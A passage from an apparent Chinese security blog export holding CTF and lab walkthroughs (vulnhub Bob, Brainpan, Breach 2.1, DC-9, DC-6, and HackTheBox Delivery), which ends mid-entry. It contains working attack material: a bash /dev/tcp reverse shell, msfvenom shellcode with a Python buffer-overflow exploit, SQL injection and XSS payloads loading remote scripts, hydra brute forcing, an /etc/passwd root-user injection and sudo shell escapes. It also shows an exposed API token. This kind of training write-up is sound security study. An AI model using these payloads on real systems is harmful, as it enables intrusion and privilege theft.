]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Bob 1.0.1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BABob-1-0-1/</url>
    <content><![CDATA[<h1 id="Bob-1-0-1"><a href="#Bob-1-0-1" class="headerlink" title="Bob 1.0.1"></a>Bob 1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.229 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.229 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Bob-1-0-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>nikto扫描</p>
<p><img src="/images/Bob-1-0-1/2.png" alt="2"></p>
<p>发现了robots.txt</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在robots.txt 提示的页面发现了命令执行</p>
<p><img src="/images/Bob-1-0-1/3.png" alt="3"></p>
<p>不过有些限制</p>
<p><img src="/images/Bob-1-0-1/4.png" alt="4"></p>
<p>看来ls执行不了，尝试<code>\l\s</code>或者<code>lsattr</code>都是可以执行的，这里有很多方法都可以绕，比如<code>echo bHM= |base64 -d |bash</code></p>
<p><img src="/images/Bob-1-0-1/5.png" alt="5"></p>
<p>接着找到了.bak备份文件</p>
<p><img src="/images/Bob-1-0-1/6.png" alt="6"></p>
<p><img src="/images/Bob-1-0-1/7.png" alt="7"></p>
<p>读取后发现就是一个黑名单的数组匹配，那连绕过都不用绕，直接payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bob-1-0-1/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先发现了sudo启动apache2和ssh的权限</p>
<p><img src="/images/Bob-1-0-1/9.png" alt="9"></p>
<p>这个应该不能用于提权</p>
<p><img src="/images/Bob-1-0-1/10.png" alt="10"></p>
<p>仔细检查，在home目录里可以发现一些信息</p>
<p><img src="/images/Bob-1-0-1/11.png" alt="11"></p>
<p>可以发现seb和jc的凭据，可以切换过去，但并没有其他发现<br>手动检查一些目录，在/home/bob/Documents里发现了login.txt.gpg，一个加密后的文件，在这种较深的目录且文件名没有关键词，linpeas就很难发现</p>
<p><img src="/images/Bob-1-0-1/12.png" alt="12"></p>
<p>继续检查Secret目录，在/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here处发现了notes.sh</p>
<p><img src="/images/Bob-1-0-1/13.png" alt="13"></p>
<p>这里的首字母就是密钥了，用它来解密文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bob-1-0-1/14.png" alt="14"></p>
<p>这里好像缺少对home目录的写权限，可以换一个用户</p>
<p><img src="/images/Bob-1-0-1/15.png" alt="15"></p>
<p>或者传回到kali里，本地解密</p>
<p><img src="/images/Bob-1-0-1/16.png" alt="16"></p>
<p>这样就获得了bob的密码了</p>
<p><img src="/images/Bob-1-0-1/17.png" alt="17"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Brainpan</title>
    <url>/2020/10/30/%E9%9D%B6%E5%9C%BABrainpan/</url>
    <content><![CDATA[<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>一道非常简单的x86缓冲区溢出，基本就是oscp的内容，对方在10000端口放了.exe程序，放在x86的windows下进行调试，最后生成x86/linux的payload就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.2.3 LPORT&#x3D;4444 -f python -b &#39;\x00&#39; -v shellcode</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">  <span class="comment">#badchar=&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">  shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xdb\xc7\xba\x87\x2d\xc3\xaf\xd9\x74\x24\xf4&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x5b\x31\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x03\xd4\x3e\x21\x5a\xeb\x9b\x52\x46\x58\x5f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xce\xe3\x5c\xd6\x11\x43\x06\x25\x51\x37\x9f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x05\x6d\xf5\x9f\x2f\xeb\xfc\xf7\x6f\xa3\xfd&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x04\x18\xb6\x01\x1b\x84\x3f\xe0\xab\x52\x10&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xb2\x98\x29\x93\xbd\xff\x83\x14\xef\x97\x75&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x3a\x63\x0f\xe2\x6b\xac\xad\x9b\xfa\x51\x63&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x0f\x74\x74\x33\xa4\x4b\xf7&quot;</span></span><br><span class="line">  buffer = <span class="string">&quot;A&quot;</span>*<span class="number">524</span>+<span class="string">&quot;\xf3\x12\x17\x31&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span></span><br><span class="line"> </span><br><span class="line">  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  </span><br><span class="line">  s.connect((<span class="string">&quot;192.168.2.179&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nDone!&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nCould not connect!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>也非常简单，发现sudo权限</p>
<p><img src="/images/brainpan/1.png" alt="1"></p>
<p>看来它能接受一些参数，按照它的语法输入whoami命令看看</p>
<p><img src="/images/brainpan/2.png" alt="2"></p>
<p>  之后的会话，看起来有点像 <code>|less</code>的情况，直接<code>!/bin/sh</code></p>
<p><img src="/images/brainpan/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Breach 2.1</title>
    <url>/2020/09/21/%E9%9D%B6%E5%9C%BABreach-2-1/</url>
    <content><![CDATA[<h1 id="Breach-2-1"><a href="#Breach-2-1" class="headerlink" title="Breach 2.1"></a>Breach 2.1</h1><p>kali:192.168.110.128<br>目标:192.168.110.151</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sV -sC -p- 192.168.110.151 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Breach-2-1/1.png" alt="1"></p>
<p>尝试ssh连接，根据提示输入凭据peter/inthesource，80端口就会打开</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Breach-2-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在blog目录的搜索出发现sql注入</p>
<p>确认漏洞的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/3.png" alt="3"></p>
<p>或者延时注入确认漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and sleep(5)#</span><br></pre></td></tr></table></figure>

<p>确认字段使用下面这个payload，这样布尔注入回显页面内容，order by错误页面不回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/4.png" alt="4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 10#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/5.png" alt="5"></p>
<p>这样就可以确认字段数了，后面可以通过union注入带回显的方式，轻松攻击数据库</p>
<p>之后就可以发现一个重要的凭据</p>
<p><img src="/images/Breach-2-1/6.png" alt="6"></p>
<p>破解后是<code>admin/32admin</code></p>
<h3 id="存储型XSS到浏览器exp"><a href="#存储型XSS到浏览器exp" class="headerlink" title="存储型XSS到浏览器exp"></a>存储型XSS到浏览器exp</h3><p>在这之后搜索公开漏洞</p>
<p><img src="/images/Breach-2-1/7.png" alt="7"></p>
<p>发现一处存储型xss漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/9.png" alt="9"></p>
<p>验证成功</p>
<p><img src="/images/Breach-2-1/8.png" alt="8"></p>
<p>之后插入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.128:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这里不用beef，不需要那么麻烦</p>
<p>先验证一下访问请求是否发出了</p>
<p><img src="/images/Breach-2-1/10.png" alt="10"></p>
<p>收到请求了，发现了对方的UA，根据UA发现了一个msf的漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multi&#x2F;browser&#x2F;firefox_proto_crmfrequest</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/11.png" alt="11"></p>
<p>设置好msf的payload</p>
<p><img src="/images/Breach-2-1/12.png" alt="12"></p>
<p>现在修改hook.js，写入跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.location.replace(&quot;http:&#x2F;&#x2F;192.168.110.128:8080&#x2F;evil&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/13.png" alt="13"></p>
<p>对方一旦访问</p>
<p><img src="/images/Breach-2-1/14.png" alt="14"></p>
<p>就成功的获取了shell，这个shell可能不稳定，执行一条命令就挂了<br>之后去查看.bashrc，可以找到无法ssh的原因</p>
<p><img src="/images/Breach-2-1/15.png" alt="15"></p>
<p>直接添加一个sh命令到.bashrc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;exec sh&quot; &gt; .bashrc</span><br></pre></td></tr></table></figure>

<p>这样就能够正常的ssh</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DC-9</title>
    <url>/2020/05/23/%E9%9D%B6%E5%9C%BADC-9/</url>
    <content><![CDATA[<h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.200</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/DC-9/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh拒绝访问</p>
<p><img src="/images/DC-9/6.jpg" alt="6"></p>
<p><code>http://192.168.1.200/display.php</code>存在一些基础的用户信息<br><code>http://192.168.1.200/search.php</code>存在一个搜索框<br><code>http://192.168.1.200/manage.php</code>存在一个登录框</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>搜索框存在sql注入漏洞</p>
<p><img src="/images/DC-9/2.jpg" alt="2"></p>
<p>从sql注入漏洞中可以挖掘出的信息</p>
<p><img src="/images/DC-9/4.jpg" alt="4"></p>
<p><img src="/images/DC-9/3.jpg" alt="3"></p>
<p><img src="/images/DC-9/5.jpg" alt="5"></p>
<p>从中获取了admin的密码，并完成了破解为<code>transorbital1</code><br>顺利登录为admin，页面多出了Add Record功能，没什么用处<br>倒是页面底部<code>File does not exist</code>看起来像文件包含漏洞</p>
<p><img src="/images/DC-9/7.jpg" alt="7"></p>
<p>尝试文件包含，利用成功</p>
<p><img src="/images/DC-9/8.jpg" alt="8"></p>
<p>之前ssh无法建立连接，我们可以推测，目标机器上可能配置了<code>knockd.conf</code>，只有按顺序敲门才可以使用服务<br>网上找了一个knockd配置示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[options]</span><br><span class="line">#UseSyslog</span><br><span class="line">LogFile &#x3D; &#x2F;knock.log                                  &#x2F;&#x2F;可以自定义日志的输出位置以及文件名</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line">sequence &#x3D; 7000,8000,9000                     &#x2F;&#x2F;定义顺序号，此处是默认的，也可以修改</span><br><span class="line">seq_timeout &#x3D; 30                                       &#x2F;&#x2F;设置超时时间太小的话可能会出错</span><br><span class="line">command &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s 192.168.1.47 -p tcp --dport 22 -j ACCEPT      &#x2F;&#x2F;-i 命令是将规则插入到最前面，最先生效，以防止过滤所有端口的情况将此条规则吃掉</span><br><span class="line">tcpflags &#x3D; syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">sequence &#x3D; 9000,8000,7000                    &#x2F;&#x2F;定义关门顺序号,与开门对应，顺序相反</span><br><span class="line">seq_timeout &#x3D; 30 </span><br><span class="line">command &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s 192.168.1.47 -p tcp --dport 22 -j ACCEPT    &#x2F;&#x2F;SSH使用完后，再将22端口“保护”起来</span><br><span class="line">tcpflags &#x3D; syn</span><br></pre></td></tr></table></figure>

<p>我们利用文件包含去尝试读取<code>/etc/knockd.conf</code></p>
<p><img src="/images/DC-9/9.jpg" alt="9"></p>
<p>得到了顺序<code>7469、8475、9842</code>，使用nc进行端口连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 7469 8475 9842 ;do nc -nv 192.168.1.200 $x; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/10.jpg" alt="10"></p>
<p>此时ssh已经可以使用了</p>
<h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><p>我们尝试上面的枚举出用户名配合常用密码字典进行ssh爆破</p>
<p>用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.200&#x2F;results.php&quot; --data&#x3D;&quot;search&#x3D;1&quot; -D &quot;users&quot; -T &quot;UserDetails&quot; -C &quot;username&quot; --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/11.jpg" alt="11"></p>
<p>成功爆破除了账户和密码</p>
<p>之后在使用用户<code>janitor</code>登录之后，找到了一个密码的文件</p>
<p><img src="/images/DC-9/12.jpg" alt="12"></p>
<p>把下列密码写入到密码字典，再次尝试爆破</p>
<p><img src="/images/DC-9/13.jpg" alt="13"></p>
<p>爆破出了joeyt的账号，尝试ssh连接</p>
<p>使用<code>sudo -l</code>看看能使用哪些root权限</p>
<p><img src="/images/DC-9/14.jpg" alt="14"></p>
<p>之后找到一个可以利用的py脚本</p>
<p><img src="/images/DC-9/15.jpg" alt="15"></p>
<p>它需要3个参数，并把第二参数写到第三个参数末尾<br>利用这点，我们可以构造一个root权限的用户，并添加到<code>/etc/passwd</code></p>
<p>使用openssl构造一个密码</p>
<p><img src="/images/DC-9/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt 000 toor</span><br><span class="line">passwd -1	&#x2F;&#x2F;使用md5</span><br><span class="line">-salt 000	&#x2F;&#x2F;使用000作为盐</span><br><span class="line">toor就是我们使用的密码</span><br></pre></td></tr></table></figure>

<p>之后复制这段消息，构造我们的/etc/passwd信息，用户名为suser</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>之后将这段消息写入到<code>/tmp</code>，执行程序进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;a</span><br><span class="line">sudo .&#x2F;test &#x2F;tmp&#x2F;a &#x2F;etc&#x2F;passwd</span><br><span class="line">su suser			&#x2F;&#x2F;密码toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/17.jpg" alt="17"></p>
<p>提权成功</p>
<p>这靶场真的屑</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DC 6</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BADC-6/</url>
    <content><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC 6"></a>DC 6</h1><p>kali:192.168.1.201<br>目标:192.168.1.203</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wordy	192.168.1.203</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.203 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.203 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/DC-6/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口存在web应用wordpress</p>
<p>wpscan先扫描插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxxx --url http:&#x2F;&#x2F;wordy&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">plainview activity monitor</span><br><span class="line">user role editor</span><br></pre></td></tr></table></figure>

<p>接着进行用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token FgsbSSc5AS81Sr5jp3CpnwZ0Mp1dcimOMpqpQpLeDsc --url http:&#x2F;&#x2F;wordy&#x2F; -e u</span><br></pre></td></tr></table></figure>

<p>发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">jens</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>之后根据这些账户进行暴力破解，这个过程慢的让人骂娘，如果你使用了rockyou</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l mark -P rockyou.txt wordy -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-6/2.png" alt="2"></p>
<p>使用<code>mark/helpdesk01</code>进行登录</p>
<p>但是这里有点尴尬，我们虽然登录，但我们不是admin，所以很难反弹shell</p>
<p><img src="/images/DC-6/3.png" alt="3"></p>
<p>寻找插件的公开漏洞</p>
<p><img src="/images/DC-6/4.png" alt="4"></p>
<p>发现了<code>plainview activity monitor</code>存在命令注入</p>
<p>我们对它进行一些修改，主要是url地址和payload的使用</p>
<p><img src="/images/DC-6/5.png" alt="5"></p>
<p>之后我们就可以获得shell了</p>
<p><img src="/images/DC-6/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在/etc/passwd中，发现这台机器有许多用户</p>
<p><img src="/images/DC-6/7.png" alt="7"></p>
<p>在home目录里发现了文件</p>
<p><img src="/images/DC-6/8.png" alt="8"></p>
<p>发现了用户凭证，直接切换过去</p>
<p>之后可以发现，该用户可以以jens执行某个shell文件</p>
<p><img src="/images/DC-6/9.png" alt="9"></p>
<p>发现我们对这个文件具有写权限</p>
<p><img src="/images/DC-6/10.png" alt="10"></p>
<p>直接写个/bin/bash过去，之后sudo执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;bin&#x2F;bash &gt;&gt; &#x2F;home&#x2F;jens&#x2F;backups.sh </span><br><span class="line">sudo -u jens &#x2F;home&#x2F;jens&#x2F;backups.sh</span><br></pre></td></tr></table></figure>

<p>这样我们就获得jens的shell</p>
<p>继续枚举，发现可以sudo执行nmap</p>
<p><img src="/images/DC-6/11.png" alt="11"></p>
<p>那提权就可以完成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; $TF</span><br><span class="line">sudo nmap --script&#x3D;$TF</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-6/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Delivery</title>
    <url>/2021/01/10/HTB-Delivery/</url>
    <content><![CDATA[<p><img src="/images/Delivery/1.png" alt="1"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Delivery/2.png" alt="2"></p>
<p>访问80端口，发现hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.52.120	delivery.htb helpdesk.delivery.htb</span><br></pre></td></tr></table></figure>

<p>得到提示</p>
<p><img src="/images/Delivery/3.png" alt="3"></p>
<p>点进去发现web应用，delivery.htb运行着OSticket，helpdesk.delivery.htb运行着Mattermost</p>
<p>感觉这里就是第一坑，这台机器不需要CVE</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这一步主要是弄明白业务逻辑</p>
<p>遵循第一个提示可以知道，我们应该在Mattermost注册一个<code>@delivery.htb</code>的邮箱，但是注册需要访问带有token的邮件来确认邮箱，这个目前是做不到的，可以利用OSticket来完成，首先通过OSticket来后台留个言，这一步的信息随便输</p>
<p><img src="/images/Delivery/4.png" alt="4"></p>
<p>之后会返回一个它自己域的邮箱地址，如果后续有问题，可以联系这个邮箱</p>
<p><img src="/images/Delivery/5.png" alt="5"></p>
<p>我们可以输入邮箱和这个工单号来查询跟进这个消息</p>
<p><img src="/images/Delivery/6.png" alt="6"></p>
<p>里面就是之前的留言消息了</p>
<p>(这里可以上传php shell，但是找不到位置)</p>
<p><img src="/images/Delivery/7.png" alt="7"></p>
<p>下一步就很有意思了，在Mattermost的注册页面，输入刚刚返回订单号的邮箱<code>8400379@delivery.htb</code></p>
<p>刷新上一步订单号的页面，发现收到了验证注册的邮件内容</p>
<p><img src="/images/Delivery/8.png" alt="8"></p>
<p>看来是服务端自己给自己发的邮件，也被当成用户输入了，这样账号就注册好了</p>
<p>凭据登录，可以发现内部聊天室，里面有root的聊天记录，是一个SSH的凭据<code>maildeliverer/Youve_G0t_Mail!</code><br>另外还提醒了内部密码没有使用rockyou，但使用了<code>PleaseSubscribe!</code>的变异</p>
<p><img src="/images/Delivery/9.png" alt="9"></p>
<p>这样就得到了foothold</p>
<p><img src="/images/Delivery/10.png" alt="10"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>这里失误了，第一感觉是去找数据库，但是找错了，浪费了一段时间，第二次重新检查的时候才反应过来</p>
<p>我在<code>/var/www/osticket/upload/include/ost-config.php</code>发现了数据库凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;DBTYPE&#39;,&#39;mysql&#39;);</span><br><span class="line">define(&#39;DBHOST&#39;,&#39;localhost&#39;);</span><br><span class="line">define(&#39;DBNAME&#39;,&#39;osticket&#39;);</span><br><span class="line">define(&#39;DBUSER&#39;,&#39;ost_user&#39;);</span><br><span class="line">define(&#39;DBPASS&#39;,&#39;!H3lpD3sk123!&#39;);</span><br></pre></td></tr></table></figure>

<p>但里面没有可以破解的有意思的hash，之后浪费了一段时间，主要原因是都去依靠linpeas了，而且这里有一些rabbit hole，比如本地的cups cms，而正确的方向，这里linpeas并没有明显的输出</p>
<p>第二次手动枚举，我去检查了<code>/opt</code>目录，这里发现了之前的web应用Mattermost，才想起来两个web应用只找了一个数据库</p>
<p>在<code>/opt/mattermost/config</code>存在Readme.md，里面有Mattermost的官方手册，这里找到了数据库的连接字段</p>
<p><img src="/images/Delivery/11.png" alt="11"></p>
<p>这样我就发现了另一个数据库的凭据</p>
<p><img src="/images/Delivery/12.png" alt="12"></p>
<p>连接数据库后，发现了root的hash</p>
<p><img src="/images/Delivery/13.png" alt="13"></p>
<p>根据之前的提示，通过hashcat对字符串<code>PleaseSubscribe!</code>的vartations，得到字典</p>
